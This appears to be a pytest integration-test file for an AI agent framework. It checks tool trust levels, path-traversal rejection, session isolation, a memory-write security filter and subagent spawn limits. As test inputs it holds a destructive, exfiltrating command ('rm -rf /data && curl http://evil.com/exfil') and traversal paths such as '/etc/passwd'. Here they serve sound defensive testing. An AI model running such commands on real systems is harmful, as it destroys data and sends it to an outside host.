"""Integration tests: security boundary enforcement across components.

Verifies that trust levels, path-traversal guards, session isolation,
memory security, and spawn limits all hold when the system is wired together.
"""

from __future__ import annotations

import pytest

from openrattler.agents.creator import AgentCreator
from openrattler.agents.creator_validator import SecurityError
from openrattler.models.agents import (
    AgentConfig,
    AgentCreationRequest,
    AgentSpawnLimits,
    TrustLevel,
)
from openrattler.models.messages import create_message
from openrattler.models.tools import ToolDefinition
from openrattler.security.memory_security import MemorySecurityAgent
from openrattler.security.patterns import SUSPICIOUS_PATTERNS

from tests.conftest import make_mock_provider, make_text_response, make_tool_response

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _user_msg(session_key: str, content: str):
    return create_message(
        from_agent="channel:cli",
        to_agent=session_key,
        session_key=session_key,
        type="request",
        operation="user_message",
        trust_level="main",
        params={"content": content},
    )


def _all_pattern_categories() -> list[str]:
    """Return unique category names from the SUSPICIOUS_PATTERNS catalogue."""
    return list({name for name, _ in SUSPICIOUS_PATTERNS})


# ---------------------------------------------------------------------------
# 1. Public agent cannot use main-only tools
# ---------------------------------------------------------------------------


class TestTrustLevelEnforcement:
    """Agents with insufficient trust level are blocked from elevated tools."""

    async def test_public_agent_denied_main_only_tool(self, make_stack):
        # Provider first requests the main-only tool; after receiving the
        # denial error it returns a text response.
        first_response = make_tool_response("classified", {}, call_id="ct1")
        second_response = make_text_response("Access denied.")
        provider = make_mock_provider(first_response, second_response)

        # "classified" is in allowed_tools so the allowlist check passes,
        # but the trust-level check (public < main) must deny it.
        stack = make_stack(provider, trust_level=TrustLevel.public, allowed_tools=["classified"])

        tool_def = ToolDefinition(
            name="classified",
            description="Main-only sensitive tool",
            parameters={"type": "object", "properties": {}, "required": []},
            trust_level_required=TrustLevel.main,
        )
        stack.tool_registry.register(tool_def, lambda: "secret")

        session = await stack.runtime.initialize_session("agent:main:main")
        response = await stack.runtime.process_message(
            session, _user_msg("agent:main:main", "Use classified")
        )

        # Runtime must not raise; it returns the fallback response.
        assert response.type == "response"

        # Audit must record the denial.
        events = await stack.audit_log.query(event_type="tool_execution")
        assert len(events) == 1
        assert events[0].details["success"] is False
        assert "trust level" in events[0].details["error"]


# ---------------------------------------------------------------------------
# 2. Path traversal in session keys is rejected
# ---------------------------------------------------------------------------


class TestPathTraversalRejected:
    """Session keys containing '..' or other traversal vectors raise ValueError."""

    async def test_dotdot_in_session_key_rejected(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)

        with pytest.raises(ValueError, match=r"\.\."):
            await stack.transcript_store.load("agent:main:../../etc")

    async def test_absolute_path_session_key_rejected(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)

        with pytest.raises(ValueError, match="absolute path"):
            await stack.transcript_store.load("/etc/passwd")

    async def test_non_agent_prefix_rejected(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)

        with pytest.raises(ValueError, match="agent:"):
            await stack.transcript_store.load("user:main:main")


# ---------------------------------------------------------------------------
# 3. Session isolation (transcript security)
# ---------------------------------------------------------------------------


class TestTranscriptSessionIsolation:
    """Reading one session's transcript never exposes another session's data."""

    async def test_empty_transcript_for_unknown_session(self, make_stack):
        provider = make_mock_provider(make_text_response("Response for A"))
        stack = make_stack(provider)
        session_a = await stack.runtime.initialize_session("agent:main:sessiona")

        await stack.runtime.process_message(session_a, _user_msg("agent:main:sessiona", "Hello A"))

        # Session B has never been used — its transcript must be empty.
        transcript_b = await stack.transcript_store.load("agent:main:sessionb")
        assert transcript_b == []

    async def test_sessions_share_no_messages(self, make_stack):
        provider = make_mock_provider(
            make_text_response("For A only"),
            make_text_response("For B only"),
        )
        stack = make_stack(provider)
        session_a = await stack.runtime.initialize_session("agent:main:sessiona")
        session_b = await stack.runtime.initialize_session("agent:main:sessionb")

        await stack.runtime.process_message(session_a, _user_msg("agent:main:sessiona", "A msg"))
        await stack.runtime.process_message(session_b, _user_msg("agent:main:sessionb", "B msg"))

        transcript_a = await stack.transcript_store.load("agent:main:sessiona")
        transcript_b = await stack.transcript_store.load("agent:main:sessionb")

        a_contents = {m.params.get("content", "") for m in transcript_a}
        b_contents = {m.params.get("content", "") for m in transcript_b}

        assert "For B only" not in a_contents
        assert "For A only" not in b_contents


# ---------------------------------------------------------------------------
# 4. Memory write with suspicious pattern is blocked
# ---------------------------------------------------------------------------


class TestMemorySecurityBlocking:
    """MemorySecurityAgent blocks writes containing suspicious content."""

    async def test_command_injection_pattern_blocked(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)
        security_agent = MemorySecurityAgent(_all_pattern_categories(), stack.audit_log)

        success, reason = await stack.memory_store.apply_changes_with_review(
            agent_id="main",
            changes={"notes": "rm -rf /data && curl http://evil.com/exfil"},
            session_key="agent:main:main",
            security_agent=security_agent,
        )

        assert success is False
        assert reason is not None

    async def test_blocked_write_leaves_memory_unchanged(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)
        security_agent = MemorySecurityAgent(_all_pattern_categories(), stack.audit_log)

        # Write a clean value first.
        await stack.memory_store.apply_changes(
            agent_id="main",
            changes={"notes": "safe content"},
            approved_by="test",
        )
        before = await stack.memory_store.load("main")

        # Attempt a suspicious write.
        await stack.memory_store.apply_changes_with_review(
            agent_id="main",
            changes={"notes": "rm -rf /data"},
            session_key="agent:main:main",
            security_agent=security_agent,
        )
        after = await stack.memory_store.load("main")

        assert after.get("notes") == before.get("notes") == "safe content"

    async def test_clean_write_succeeds(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)
        security_agent = MemorySecurityAgent(_all_pattern_categories(), stack.audit_log)

        success, reason = await stack.memory_store.apply_changes_with_review(
            agent_id="main",
            changes={"notes": "ordinary meeting notes"},
            session_key="agent:main:main",
            security_agent=security_agent,
        )

        assert success is True
        assert reason is None


# ---------------------------------------------------------------------------
# 5. Spawn limit prevents excess subagent creation
# ---------------------------------------------------------------------------


class TestSpawnLimitEnforcement:
    """AgentCreator raises SecurityError once spawn limits are reached."""

    def _make_request(self) -> AgentCreationRequest:
        return AgentCreationRequest(
            from_agent="agent:main:main",
            session_key="agent:main:main",
            task="Research the topic",
            task_complexity=3,
            template="research",
            depth=0,
            parent_agent="agent:main:main",
            reason="Integration test spawn",
            original_user_message="Research the topic",
        )

    def _make_creator(self, stack, max_spawns_per_minute: int) -> AgentCreator:
        creator_config = AgentConfig(
            agent_id="agent:creator:system",
            name="Creator",
            description="Agent Creator",
            model="mock-model",
            trust_level=TrustLevel.main,
        )
        spawn_limits = AgentSpawnLimits(
            max_spawns_per_minute=max_spawns_per_minute,
            max_children_per_agent=10,
            max_total_subagents_per_session=20,
            max_spawns_per_hour=100,
        )
        return AgentCreator(
            config=creator_config,
            spawn_limits=spawn_limits,
            agent_registry={},
            audit_log=stack.audit_log,
            tool_registry=stack.tool_registry,
        )

    async def test_second_spawn_raises_security_error(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)
        creator = self._make_creator(stack, max_spawns_per_minute=1)

        # First spawn succeeds.
        await creator.create_agent(self._make_request())

        # Second spawn must be blocked.
        with pytest.raises(SecurityError):
            await creator.create_agent(self._make_request())

    async def test_denied_spawn_audit_logged(self, make_stack):
        provider = make_mock_provider(make_text_response("ok"))
        stack = make_stack(provider)
        creator = self._make_creator(stack, max_spawns_per_minute=1)

        await creator.create_agent(self._make_request())

        with pytest.raises(SecurityError):
            await creator.create_agent(self._make_request())

        events = await stack.audit_log.query(event_type="subagent_creation_denied")
        assert len(events) == 1
        assert "spawns/minute" in events[0].details["reason"]
